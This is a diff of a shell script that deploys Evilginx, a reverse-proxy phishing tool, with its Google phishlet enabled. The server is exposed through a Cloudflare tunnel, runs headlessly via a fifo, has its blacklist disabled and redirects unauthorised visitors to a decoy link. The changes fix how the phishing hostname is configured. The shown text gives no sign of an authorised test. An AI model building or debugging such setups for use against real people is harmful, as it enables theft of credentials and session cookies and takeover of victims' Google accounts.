@@ -26,16 +26,13 @@ sleep 2
 nohup "$CLOUDFLARED" tunnel --url "https://$HOST:443" --no-tls-verify > cloudflared.log 2>&1 &
 sleep 3
 
-echo "--- generate self-signed cert for $HOST ---"
-openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/egkey.pem -out /tmp/egcert.pem -days 1 -subj "/CN=$HOST" 2>/dev/null
-
-echo "--- writing evilginx config (enable google) ---"
+echo "--- writing evilginx config (enable google, bare hostname) ---"
 $SUDO mkdir -p /root/.evilginx
-echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$URL\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
+echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$HOST\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
 
 echo "--- starting evilginx (headless via fifo) ---"
 rm -f /tmp/eg_in; mkfifo /tmp/eg_in
-( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config autocert off"; sleep 1; echo "phishlets enable google"; sleep 1; echo "cert /tmp/egcert.pem /tmp/egkey.pem"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
+( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config autocert off"; sleep 1; echo "phishlets hostname google $HOST"; sleep 1; echo "phishlets enable google"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
 "$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &
 
 echo "--- waiting for :443 (up to 60s) ---"
